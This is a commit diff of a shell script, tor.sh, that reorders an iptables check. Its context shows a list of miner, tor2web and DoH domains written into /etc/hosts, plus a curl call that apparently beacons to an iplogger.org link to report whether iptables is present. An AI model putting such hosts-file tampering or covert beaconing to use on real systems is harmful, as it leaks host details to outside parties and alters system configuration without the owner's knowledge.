2340ed2749060f0ffb1e02265a9e5f9c3334b177
zoalsharf <34942644+zoalsharf@users.noreply.github.com>
2020-12-20 09:09:12 -0800

    Update tor.sh

--- tor.sh
+++ tor.sh
@@ -1,5 +1,6 @@
+d=$(command -v iptables|wc -l)
 h=(doh.defaultroutes.de dns.hostux.net dns.twnic.tw dns.rubyfish.cn doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org uncensored.any.dns.nixnet.xyz tor2web.in tor2web.ch tor2web.io tor2web.to tor2web.su checkip.amazonaws.com ip.sb onion.foundation onion.com.de onion.sh 4tor.ml d2web.org onion.mn onion.in.net onion.to civiclink.network onion.pet onion.glass onion.ws aliyun.one lsd.systemten.org pastebin.com pm.cpuminerpool.com systemten.org relay.tor2socks.in)
-f="/etc/hosts"
+f=/etc/hosts
 f1="/etc/cloud/templates/hosts.redhat.tmpl"
 f2="/etc/cloud/templates/hosts.debian.tmpl"
 f3="/etc/cloud/templates/hosts.ubuntu.tmpl"
@@ -29,7 +30,6 @@ chek (){
 }
 chekhosts
 chek
-d=$(command -v iptables|wc -l)
 if [ $d -eq "1" ]; then
 	curl -A Iptables-found/1.9 -sLo https://iplogger.org/389LB3
 else
